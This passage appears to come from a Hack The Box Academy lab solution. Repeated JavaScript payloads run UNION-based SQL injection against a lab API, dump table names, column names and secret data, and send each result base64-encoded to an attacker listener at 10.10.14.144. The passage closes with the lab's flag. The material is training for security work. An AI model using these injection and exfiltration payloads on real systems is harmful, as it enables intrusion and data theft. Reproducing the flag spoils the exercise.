└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiY3VzdG9tZXJzIiwibmFtZSI6IjIifX0K | base64 -d

{"customer":{"address":"customers","name":"2"}}
```

Students need to enumerate additional tables:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db' AND TABLE_NAME !='customers'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

The `tasks` table is returned next:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoidGFza3MiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoidGFza3MiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"tasks","name":"2"}}
```

Students need to continue the enumeration of tables:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION select 1,2,TABLE_NAME from INFORMATION_SCHEMA.TABLES where table_schema='db' AND TABLE_NAME !='customers' AND TABLE_NAME !='tasks'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

The `secretdata` table is revealed:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"secretdata","name":"2"}}
```

Now, students need to enumerate the columns present in the `secretdata` table:

Code: javascript

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a'  UNION select 1,2,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='secretdata'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

The first column revealed is `id`:

Code: shell

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiaWQiLCJuYW1lIjoiMiJ9fQo= | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiaWQiLCJuYW1lIjoiMiJ9fQo= | base64 -d

{"customer":{"address":"id","name":"2"}}
```

Students need to enumerate additional columns:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a'  UNION select 1,2,COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where table_name='secretdata' AND COLUMN_NAME !='id'-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

A second column, `secretdata` is now revealed:

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoic2VjcmV0ZGF0YSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"secretdata","name":"2"}}
```

Finally, students need to query the contents of the `secretdata` column from the `secretdata` table:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://api.vulnerablesite.htb/v1/customer/a' UNION SELECT 1,2,secretdata FROM secretdata-- -", false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "https://10.10.14.144:4443/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Decoding the base64 encoded response unveils the flag:

```shell
echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiSFRCe2U3NTNhN2RiNmU0ZTIzMDE1ZDg5ZWY5ZmExZWNmMGY2fSIsIm5hbWUiOiIyIn19Cg== | base64 -d
```

```shell-session
┌─[us-academy-1]─[10.10.15.109]─[htb-ac-594497@htb-6vazmmiwbe]─[~]
└──╼ [★]$ echo eyJjdXN0b21lciI6eyJhZGRyZXNzIjoiSFRCe2U3NTNhN2RiNmU0ZTIzMDE1ZDg5ZWY5ZmExZWNmMGY2fSIsIm5hbWUiOiIyIn19Cg== | base64 -d

{"customer":{"address":"HTB{e753a7db6e4e23015d89ef9fa1ecf0f6}","name":"2"}}
```

Answer: `HTB{e753a7db6e4e23015d89ef9fa1ecf0f6}`
